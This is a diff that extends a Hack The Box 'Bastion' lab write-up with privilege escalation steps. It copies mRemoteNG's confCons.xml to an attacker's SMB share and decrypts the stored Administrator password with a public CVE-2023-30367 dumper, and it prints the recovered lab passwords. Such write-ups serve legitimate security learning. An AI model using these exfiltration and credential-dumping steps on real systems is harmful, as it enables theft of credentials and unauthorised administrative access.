@@ -2,6 +2,10 @@
 1.  Initial Nmap Enumeration
 2.  SMB Enumeration - Port 139,445
 3. Cracking the hash using hashcat
+4. Privilege Escalation using winPEAS
+	4.1  **It Is Always a Good Idea to Check AppData Folder on Windows machine**
+5. **Transferring Files from Target (Victim) to Attacker (Kali) Machine**
+6. Lesson Learned
 
 ### Initial Nmap Enumeration
 
@@ -377,3 +381,121 @@ l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
 ```
 
 Got the User flag
+
+### Privilege Escalation using winPEAS
+
+I was solving this box step by step by providing the each flag in the guided mode on Hack The  Box. One of the question was to find out any unusual remote connection management tool Installed on the target. I found that `mRemoteNG` was installed. Here is my winPEAS enumeration results.
+```
+ [+] INSTALLED SOFTWARE     
+   [i] Some weird software? Check for vulnerabilities in unknow software installed  
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software  
+
+Common Files  
+Common Files  
+Internet Explorer           
+Internet Explorer           
+Microsoft.NET 
+mRemoteNG          # mRemoteNG is Installed and located at C:\Program Files (X86)\mRemoteNG\ Folder.
+OpenSSH-Win64 
+PackageManagement           
+VMware        
+Windows Defender            
+Windows Defender            
+Windows Mail  
+Windows Mail  
+Windows Media Player        
+Windows Media Player        
+Windows Multimedia Platform 
+Windows Multimedia Platform
+
+Folder: \Microsoft\Windows\.NET Framework                                                                
+.NET Framework NGEN v4.0.30319      N/A          Ready                                                  
+.NET Framework NGEN v4.0.30319 64    N/A          Ready    
+
+```
+
+While digging the box, I ended up checking the AppData folder at the following location and found some Interesting Files.
+```
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir            
+ Volume in drive C has no label.            
+ Volume Serial Number is 1B7D-E692          
+
+ Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG   
+
+22-02-2019  15:03    <DIR>          .       
+22-02-2019  15:03    <DIR>          ..      
+22-02-2019  15:03             6.316 confCons.xml          
+22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup           
+22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup           
+22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup           
+22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup           
+22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup           
+22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup           
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup           
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup           
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup           
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup           
+22-02-2019  15:03  51 extApps.xml         
+15-08-2024  20:16            11.535 mRemoteNG.log       
+22-02-2019  15:03             2.245 pnlLayout.xml       
+22-02-2019  15:01    <DIR>          Themes
+14 File(s)         82.895 bytes           
+ 3 Dir(s)   4.787.867.648 bytes free      
+```
+
+Look at the Path. `C:\Users\L4mpje\AppData\Roaming\mRemoteNG`. **It is important to check AppData --> Local and AppData --> Roaming Directory Even if any Interesting Software is not Installed on the target. Sometimes, it stores .log files which reveals interesting information.**
+
+Now I was trying to find vulnerabilities for mRemoteNG and stumbled upon this link which reveals what the vulnerability is and the PoC.
+
+[Exploit-DB](https://www.exploit-db.com/exploits/51637)
+[mRemoteNG <= v1.77.3.1784-NB Password Dumper (CVE-2023-30367)](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper)
+
+There's a demo include in the GitHub Link. i simply follow the demo and got the Admin Credentials. 
+
+#### Transferring Files from Target (Victim) to Attacker (Kali) Machine.
+
+So far, I have transferred the files multiple times from Kali to Target by running simply `impacket-smbserver` command on the Kali and than mount the share on Windows Machine. However, This time, I had to transfer the files from Windows (Target) machine to my Attacking Machine (Kali). I will admit that I googled couple of ways on how to do it BUT I was not using my common sense of using the same `impacket-smbserver` command to transfer the files from Windows (Victim) to Kali.
+
+First, run the `impacket-smbserver` on kali.
+
+```
+$ impacket-smbserver b /home/ringbuffer/Downloads/Bastion.htb -smb2support
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+Now go to your Victim/Target Windows Box and simply use the Copy Command other way around.
+
+```
+PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> copy .\confCons.xml \\10.10.16.5\b\confCons.xml  
+```
+
+This Will Copy the confCons.xml file from the Windows machine to the Kali Linux. Once you execute the above copy command, you will see the confCons.xml file in the same directory where `impacket-smbserver` is running.
+
+Once the `confCons.xml` was copied. I used the following python script from the GitHub Repo to decrypt the cleartext password stored in the `confCons.xml` file.
+```
+┌──(ringbuffer㉿kali)-[~/Downloads/Bastion.htb/CVE-2023-30367-mRemoteNG-password-dumper]
+└─$ python mremoteng_decrypt.py -rf /home/ringbuffer/Downloads/Bastion.htb/confCons.xml 
+Username: Administrator
+Hostname: 127.0.0.1
+Encrypted Password: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw== 
+Decrpyted Password: thXLHM96BeKL0ER2 
+
+Username: L4mpje
+Hostname: 192.168.1.75
+Encrypted Password: yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB 
+Decrpyted Password: bureaulampje 
+```
+
+Upon Obtaining the Administrator Credentials, I SSH into Admin and got my root flag.
+
+### Lesson Learned
+
+1. Do check `C:\Users\L4mpje\AppData\` **Local** and **Roaming** Folder for any interesting files along with **Program files** and **Program Files (x86)** Folder.
+2. When Starting the `impacket-smbserver`, you can copy both ways.
